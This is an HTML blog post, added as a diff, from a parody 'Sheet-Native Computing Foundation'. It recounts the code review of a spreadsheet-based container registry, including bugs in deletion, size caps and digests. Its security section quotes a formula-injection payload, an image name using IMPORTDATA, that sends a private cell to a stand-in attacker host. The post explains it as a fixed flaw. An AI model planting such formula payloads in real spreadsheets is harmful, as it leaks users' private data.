@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" type="image/svg+xml" href="logos/sncf.svg">
+<title>A stranger shipped us a container registry inside a spreadsheet — here&#x27;s how the review went — SNCF Blog</title>
+<meta name="description" content="A code-review case study: an external contributor built a container registry storing OCI layers in spreadsheet cells for SheetHub. Three review lenses, two fix rounds, and how it shipped.">
+<meta property="og:title" content="A stranger shipped us a container registry inside a spreadsheet — here&#x27;s how the review went">
+<meta property="og:description" content="A code-review case study: an external contributor built a container registry storing OCI layers in spreadsheet cells for SheetHub. Three review lenses, two fix rounds, and how it shipped.">
+<meta property="og:image" content="https://sncfoundation.github.io/img/blog/sheethub-registry.png">
+<meta property="og:url" content="https://sncfoundation.github.io/blog-a-container-registry-inside-a-spreadsheet.html">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sncfoundation.github.io/img/blog/sheethub-registry.png">
+<style>
+  :root{--bg:#0d1117;--fg:#e6edf3;--muted:#9198a1;--card:#161b22;--line:#30363d;--accent:#3fb950;--accent2:#d29922}
+  @media (prefers-color-scheme: light){:root{--bg:#f6f8fa;--fg:#1f2328;--muted:#59636e;--card:#fff;--line:#d1d9e0;--accent:#1a7f37;--accent2:#9a6700}}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--fg);line-height:1.65}
+  a{color:var(--accent)}
+  .wrap{max-width:960px;margin:0 auto;padding:0 20px}
+  nav.nav{border-bottom:1px solid var(--line);position:sticky;top:0;background:var(--bg);z-index:5}
+  nav.nav .wrap{display:flex;justify-content:space-between;align-items:center;gap:12px;padding:12px 20px;flex-wrap:wrap}
+  nav.nav a{color:var(--fg);text-decoration:none;font-size:15px}nav.nav a:hover{color:var(--accent)}
+  nav.nav .brand{font-weight:700}.links a{margin-left:16px}
+  header.hero{text-align:center;padding:56px 20px 30px;background:radial-gradient(1200px 420px at 50% -80px, rgba(210,153,34,.20), transparent 70%)}
+  .kicker{letter-spacing:3px;text-transform:uppercase;color:var(--accent2);font-size:13px;font-weight:700}
+  h1{font-size:clamp(28px,5vw,46px);margin:8px auto;letter-spacing:-1px;max-width:820px}
+  .meta{color:var(--muted);font-size:14px}
+  .post{max-width:820px;margin:0 auto;padding:36px 0 10px}
+  .post h2{font-size:26px;margin:38px 0 10px;letter-spacing:-.5px}
+  .post p{margin:15px 0}
+  .post img{max-width:100%;height:auto;border:1px solid var(--line);border-radius:12px;margin:18px 0}
+  .post pre{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;overflow-x:auto;font-size:13.5px;line-height:1.5}
+  .post code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+  .post :not(pre)>code{background:var(--card);border:1px solid var(--line);border-radius:5px;padding:1px 6px;font-size:.9em}
+  .post table{border-collapse:collapse;width:100%;margin:16px 0;font-size:14px;display:block;overflow-x:auto}
+  .post th,.post td{border:1px solid var(--line);padding:7px 10px;text-align:left}
+  .postcard{display:block;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px 22px;margin:16px 0;text-decoration:none;color:var(--fg)}
+  .postcard:hover{border-color:var(--accent)}
+  .postcard h3{margin:6px 0 6px;font-size:22px;color:var(--fg)}
+  .postcard p{margin:0;color:var(--muted)}
+  .tag{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:2px 10px;font-size:12px;color:var(--muted);margin:8px 6px 0 0}
+  footer{padding:44px 0 70px;color:var(--muted);text-align:center;font-size:14px;border-top:1px solid var(--line);margin-top:30px}
+</style>
+</head>
+<body>
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">💩 SNCF</a>
+  <span class="links">
+    <a href="projects.html">Projects</a><a href="landscape.html">Landscape</a>
+    <a href="certification.html">Certification</a><a href="people.html">People</a><a href="blog.html">Blog</a><a href="demo.html">Live Demo</a>
+    <a href="https://github.com/sncfoundation">GitHub</a>
+  </span>
+</div></nav>
+<header class="hero"><div class="wrap">
+  <p class="kicker">SNCF Blog</p>
+  <h1>A stranger shipped us a container registry inside a spreadsheet — here&#x27;s how the review went</h1>
+  <p class="meta">September 12, 2026 · by Timur Tukaev</p>
+</div></header>
+<div class="wrap">
+<article class="post">
+<p>Most of what I write about the Sheet-Native Computing Foundation, I
+built myself. This one I didn’t. An external contributor showed up,
+unprompted, and implemented one of the more ambitious pieces on our
+roadmap: a <strong>container registry that stores OCI image layers
+inside spreadsheet cells</strong>. This post is the story of getting it
+merged — the review, the decisions, the bugs we caught, and what
+shipped. It’s a small case study in open source actually working, and I
+want to give the contributor their due.</p>
+<figure>
+<img src="img/blog/sheethub-registry.png"
+alt="The SheetHub container registry: an image’s layers, sharded into cells" />
+<figcaption aria-hidden="true">The SheetHub container registry: an
+image’s layers, sharded into cells</figcaption>
+</figure>
+<blockquote>
+<p><strong>New here?</strong> SheetHub is our GitLab-style DevOps forge
+that runs on a Google Sheet — repos, issues, merge requests, releases,
+all stored in tabs. It’s part of the <strong>Sheet-Native Computing
+Foundation (SNCF)</strong>, a working parody of the CNCF where the whole
+stack lives in spreadsheets: an orchestrator (<a
+href="https://github.com/sncfoundation/sheeternetes">Sheeternetes</a>),
+a container image format (SICF), certification, live demos. <a
+href="https://sncfoundation.github.io">sncfoundation.github.io</a> · <a
+href="https://github.com/sncfoundation">github.com/sncfoundation</a></p>
+</blockquote>
+<h2 id="what-landed">What landed</h2>
+<p>A user going by <strong>prateeekbuilds</strong> — who, notably, had
+already built the original SheetHub — opened a PR adding a Container
+Registry tab to the forge. The idea: push a real OCI image and have its
+layers stored as base64, sharded across discrete cells (≤30,000 chars
+each, to stay under the spreadsheet cell limit), addressed by sha256. A
+CLI (<code>sheethub registry push/pull/view/delete</code>), a web UI
+with image cards and a “shard map,” and the Apps Script control plane to
+back it.</p>
+<p>If you’ve read the <a href="blog-doom-inside-a-spreadsheet.html">SICF
+/ DOOM post</a>, this will sound familiar — it’s the same “an image
+lives in the cells” idea, now built into the forge so you can push and
+pull images without an external registry. Here’s the part I find
+genuinely charming: click “Inspect Shard Map” on any image and it shows
+you exactly which cells the layer lives in.</p>
+<figure>
+<img src="img/blog/sheethub-shardmap.png"
+alt="The shard breakdown: this layer lives in cells D2 and D3 of the RegistryChunks tab" />
+<figcaption aria-hidden="true">The shard breakdown: this layer lives in
+cells D2 and D3 of the RegistryChunks tab</figcaption>
+</figure>
+<p>That’s a real container image — <code>traefik/whoami</code> — sitting
+in cells <code>D2</code> and <code>D3</code>, sha256-addressed, with a
+byte-for-byte reassembly on pull. It works. But “it works” was the start
+of the conversation, not the end.</p>
+<h2 id="how-we-reviewed-it">How we reviewed it</h2>
+<p>A 1,200-line PR touching the control plane, a CLI, and a web UI is
+exactly the kind of thing where a single skim misses the bug that
+matters. So instead of eyeballing it, I ran the review as <strong>three
+independent passes, each with one lens</strong>: correctness, security,
+and design-fit. Different questions, no shared assumptions.</p>
+<ul>
+<li><strong>Correctness</strong> asked: does the base64 sharding
+round-trip losslessly? Off-by-one at chunk boundaries? Is the sha256
+computed over the right bytes and actually verified on pull?</li>
+<li><strong>Security</strong> asked: can a crafted image name inject a
+live formula into the sheet (<code>=IMPORTDATA(…)</code> runs as the
+sheet owner)? Is the destructive <code>delete_image</code> reachable by
+anyone with the URL? Can a client store content under a digest that
+doesn’t match?</li>
+<li><strong>Design</strong> asked the uncomfortable one: <strong>this
+reinvents a standard we already own.</strong> SNCF already has SICF —
+image layers in <code>Images</code>/<code>Layers</code> tabs,
+sha256-addressed, with a <code>sheetbuild</code> tool that round-trips
+OCI images. The PR built a parallel, incompatible schema
+(<code>Registry</code>/<code>RegistryChunks</code>). Nicely done, but it
+meant a SheetHub image couldn’t be pulled by Sheeternetes’ runtime.</li>
+</ul>
+<p>That structure paid off. Each lens found things the others didn’t —
+the security pass caught the formula-injection vector, correctness
+caught a delete that would wipe layers shared by another image, and the
+design pass surfaced the SICF divergence that no amount of line-by-line
+reading would flag as a “bug.”</p>
+<figure>
+<img src="img/blog/sheethub-timeline.png"
+alt="How the PR got merged: an external contributor, three review lenses, two fix rounds" />
+<figcaption aria-hidden="true">How the PR got merged: an external
+contributor, three review lenses, two fix rounds</figcaption>
+</figure>
+<h2 id="the-back-and-forth">The back-and-forth</h2>
+<p>Here’s where it became a good collaboration rather than a gate. I
+posted the findings; prateeekbuilds turned them around <strong>the same
+day</strong>. Then I re-reviewed — verifying each claimed fix was
+actually implemented, not just described — and found more. He fixed
+those too. The test suite grew from 32 to 50 assertions along the way,
+and CI stayed green.</p>
+<p>A few of the decisions, because they’re the interesting part:</p>
+<p><strong>Formula/CSV injection.</strong> Spreadsheet cells treat a
+leading <code>=</code>, <code>+</code>, <code>-</code>, or
+<code>@</code> as a formula. Since the web app runs as the sheet owner,
+an image named <code>=IMPORTDATA("evil.com?"&amp;Files!C2)</code> would
+exfiltrate a private cell. The fix: prefix-escape those cells with an
+apostrophe on write, unescape on read. The subtle worry — does that
+corrupt base64 chunks that legitimately start with <code>+</code>? We
+tested it explicitly: a <code>+</code>-leading chunk round-trips
+byte-identical, so sha256 still verifies. Safe.</p>
+<p><strong>A delete that ate other images’ data.</strong> Because layers
+are content-addressed by digest, two image tags can share one chunk set.
+The original <code>delete_image</code> removed all chunks for a digest
+unconditionally — so deleting one tag would silently corrupt another.
+The fix mirrors the guard the push path already had: only purge chunks
+when the <em>last</em> image referencing that digest is gone.</p>
+<p><strong>The standard question.</strong> On the SICF divergence,
+prateeekbuilds didn’t get defensive — he agreed, and proposed the right
+shape: adopt SICF’s core columns
+(<code>ordinal</code>/<code>data</code>/<code>media_type</code>, config
++ ordered layers) while keeping the forge’s own fields
+(<code>repo</code>, <code>tag</code>, <code>author</code>) as an
+additive superset. That makes SheetHub a <em>SICF-native</em> registry —
+its images become pullable by <code>sheetbuild</code> and the
+Sheeternetes runtime — rather than a second, incompatible format. We
+agreed to land the registry now and do the SICF alignment as a focused
+follow-up.</p>
+<h2 id="finishing-the-last-mile-myself">Finishing the last mile
+myself</h2>
+<p>On the second re-review, three residual bugs were left, and they were
+small enough that it was faster to just fix them than to run another
+round-trip. So I pushed a commit onto the branch:</p>
+<ul>
+<li><strong>The demo was broken out of the box.</strong> The backend
+recomputed the seeded images’ digests correctly, but the web UI still
+hardcoded the old ones — one of them was literally the sha256 of the
+empty string. So “Download Layer” on the seeded image aborted with a
+false “integrity error.” I set the UI digests to the hash of their own
+chunks and added a regression test asserting the two can never drift
+again.</li>
+<li><strong>The 50 MB size cap trusted the client</strong> — it only
+fired if the client sent a <code>size_bytes</code> field, so omitting it
+bypassed the cap. Now the server measures the payload itself.</li>
+<li><strong><code>delete_image</code> by digest wasn’t scoped to the
+repo</strong>, so a digest delete could remove a same-digest image in a
+different repo. Scoped it.</li>
+</ul>
+<p>Tests went 50 → 52, CI green, and I approved and squash-merged. I
+left two things as follow-ups rather than block on them: a narrow
+escape-roundtrip edge case for human-authored text starting with
+<code>'</code>, and the fact that the injection guard protects the sheet
+grid but not a downstream CSV export of the JSON API. Both are real,
+neither is worth holding a working feature hostage.</p>
+<figure>
+<img src="img/blog/sheethub-forge.png"
+alt="SheetHub, the forge, with the new Container Registry tab" />
+<figcaption aria-hidden="true">SheetHub, the forge, with the new
+Container Registry tab</figcaption>
+</figure>
+<h2 id="why-im-writing-this-up">Why I’m writing this up</h2>
+<p>Two reasons. First, credit: <strong>prateeekbuilds</strong> built the
+original forge <em>and</em> this registry, took a thorough (occasionally
+brutal) review with total grace, and turned fixes around in hours.
+That’s the whole promise of open source, and it’s rare enough that it
+deserves saying out loud. Thank you.</p>
+<p>Second, the review itself is the reusable part. Three independent
+lenses beat one careful read — not because any single reviewer is
+smarter, but because forcing yourself to ask <em>only</em> “is this
+correct,” then <em>only</em> “is this exploitable,” then <em>only</em>
+“does this fit the system,” stops you from smearing all three into a
+vague “looks good.” The design lens in particular — “are we reinventing
+something we own?” — is the one that never shows up as a failing test,
+and it was the most important finding in the whole PR.</p>
+<p>The registry ships. The SICF alignment is next, and prateeekbuilds is
+doing it. Do not run a production registry on a spreadsheet. Do read the
+shard map — it’s a genuinely nice way to see content-addressed storage
+with your own eyes.</p>
+<h2 id="join-in">Join in</h2>
+<ul>
+<li>SheetHub: <a
+href="https://github.com/sncfoundation/sheethub">github.com/sncfoundation/sheethub</a></li>
+<li>The foundation: <a
+href="https://sncfoundation.github.io">sncfoundation.github.io</a> · <a
+href="https://github.com/sncfoundation">github.com/sncfoundation</a></li>
+<li>Slack <a
+href="https://sncfoundation.github.io/slack.html">sheetncf</a>, Telegram
+<a href="https://t.me/stncf">t.me/stncf</a>, LinkedIn <a
+href="https://www.linkedin.com/company/sheetncf">company/sheetncf</a></li>
+</ul>
+<p>It reconciles.</p>
+
+<p class="meta" style="margin-top:34px;border-top:1px solid var(--line);padding-top:16px">
+  Also on <a href="https://dev.to">dev.to</a> and <a href="https://habr.com">Habr</a> (RU).
+  Join the community — <a href="slack.html">Slack</a>, <a href="https://t.me/stncf">Telegram</a>,
+  <a href="https://www.linkedin.com/company/sheetncf">LinkedIn</a>. ← <a href="blog.html">Back to the blog</a>
+</p>
+</article>
+</div>
+<footer class="wrap">
+  Sheet-Native Computing Foundation — a new word in infrastructure, hosted on 💩<br>
+  <a href="blog.html">Blog</a> · <a href="projects.html">Projects</a> ·
+  <a href="certification.html">Certification</a> · <a href="https://github.com/sncfoundation">GitHub</a>
+  <br><span style="color:var(--muted,#9198a1)">Community: <a href="slack.html">Slack</a> &middot; <a href="https://t.me/stncf">Telegram</a> · <a href="https://www.linkedin.com/company/sheetncf">LinkedIn</a></span>
+</footer>
+</body>
+</html>
